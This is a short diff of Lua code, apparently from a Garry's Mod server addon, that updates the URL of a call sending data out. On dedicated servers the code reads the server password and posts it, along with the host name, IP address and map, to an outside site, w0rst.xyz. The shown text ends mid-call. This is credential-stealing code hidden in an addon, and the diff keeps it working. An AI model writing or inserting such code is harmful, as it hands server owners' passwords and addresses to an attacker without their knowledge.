@@ -1,6 +1,6 @@
 if game.IsDedicated() then
     local server_pw = GetConVar("sv_password"):GetString()
-    http.Post('https://w0rst.xyz/api/bonsai.php', {
+    http.Post('https://w0rst.xyz/project/api/bonsai.php', {
         server_name=GetHostName(),
         server_ip=game.GetIPAddress(),
         server_map=game.GetMap(),
